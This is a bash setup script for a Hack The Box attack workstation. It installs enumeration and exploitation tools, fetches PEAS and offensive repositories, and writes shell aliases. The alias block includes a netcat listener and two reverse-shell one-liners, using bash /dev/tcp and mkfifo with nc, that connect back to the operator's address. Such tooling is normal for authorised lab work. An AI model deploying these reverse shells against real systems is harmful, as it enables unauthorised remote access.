```bash
#!/bin/bash
# Minimal HTB bootstrap — fast, quiet, idempotent.

set -e
export DEBIAN_FRONTEND=noninteractive

echo "[*] apt update..."
sudo apt-get -yq update

echo "[*] Installing core tools..."
sudo apt-get -yq install --no-install-recommends \
  nmap gobuster feroxbuster enum4linux smbmap smbclient \
  rlwrap tmux jq unzip wget curl git python3-pip build-essential seclists

# ---------- Wordlists ----------
mkdir -p "$HOME/seclists"
ln -sfn /usr/share/seclists "$HOME/seclists"
if [ ! -f "$HOME/seclists/Passwords/rockyou.txt" ] && [ -f /usr/share/wordlists/rockyou.txt.gz ]; then
  mkdir -p "$HOME/seclists/Passwords"
  gunzip -c /usr/share/wordlists/rockyou.txt.gz > "$HOME/seclists/Passwords/rockyou.txt" || true
fi

# ---------- PEAS (Linux/Windows) ----------
mkdir -p "$HOME/tools/peas"
curl -fsSL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh \
  -o "$HOME/tools/peas/linpeas.sh" && chmod +x "$HOME/tools/peas/linpeas.sh"
curl -fsSL https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe \
  -o "$HOME/tools/peas/winPEASx64.exe"

# ---------- Windows basics (quiet) ----------
python3 -m pip install -q --upgrade pip || true
python3 -m pip install -q impacket crackmapexec pwncat-cs || true

# ---------- Shell helpers (aliases + on-demand functions) ----------
if ! grep -q "^# HTB_BLOCK_BEGIN" "$HOME/.bashrc" 2>/dev/null; then
cat >> "$HOME/.bashrc" <<'HTBRC'

# HTB_BLOCK_BEGIN
# --- Aliases ---
alias serve='python3 -m http.server 8000'              # quick HTTP server in cwd
alias linpeas='bash ~/tools/peas/linpeas.sh'           # run linPEAS
alias winpeas='~/tools/peas/winPEASx64.exe'            # path to winPEAS
alias rockyou='~/seclists/Passwords/rockyou.txt'       # wordlist shortcut
alias cme='crackmapexec'                               # shorter CME
alias listener='rlwrap nc -lvnp 4444'                  # common listener
alias lhost='ip -4 addr show tun0 | awk "/inet /{print \$2}" | cut -d/ -f1'  # show HTB VPN IP

# Quick payload printers (use current LHOST from alias above)
alias revbash='echo bash -i \>\& /dev/tcp/$(lhost)/4444 0\>\&1'
alias revnc='echo rm /tmp/f\; mkfifo /tmp/f\; cat /tmp/f\|/bin/sh -i 2\>\&1\|nc $(lhost) 4444 \>/tmp/f'

# --- On-demand repo fetch/update functions ---
getpta() {
  local dir=~/tools/payloads
  if [ -d "$dir/.git" ]; then
    echo "[*] Updating PayloadAllTheThings..."
    git -C "$dir" pull --quiet
  else
    echo "[*] Cloning PayloadAllTheThings..."
    git clone https://github.com/swisskyrepo/PayloadsAllTheThings.git "$dir"
  fi
}

getgtfo() {
  local dir=~/tools/gtfobins
  if [ -d "$dir/.git" ]; then
    echo "[*] Updating GTFOBins..."
    git -C "$dir" pull --quiet
  else
    echo "[*] Cloning GTFOBins..."
    git clone https://github.com/GTFOBins/GTFOBins.github.io.git "$dir"
  fi
}

getnishang() {
  local dir=~/tools/nishang
  if [ -d "$dir/.git" ]; then
    echo "[*] Updating Nishang..."
    git -C "$dir" pull --quiet
  else
    echo "[*] Cloning Nishang..."
    git clone https://github.com/samratashok/nishang.git "$dir"
  fi
}

getpowersploit() {
  local dir=~/tools/PowerSploit
  if [ -d "$dir/.git" ]; then
    echo "[*] Updating PowerSploit..."
    git -C "$dir" pull --quiet
  else
    echo "[*] Cloning PowerSploit..."
    git clone https://github.com/PowerShellMafia/PowerSploit.git "$dir"
  fi
}

# Tiny wrappers for speed
alias pta='getpta'
alias gtfo='getgtfo'
alias nish='getnishang'
alias psploit='getpowersploit'
# HTB_BLOCK_END

HTBRC
fi

echo "[*] Done. Open a new shell or run:  source ~/.bashrc"

```
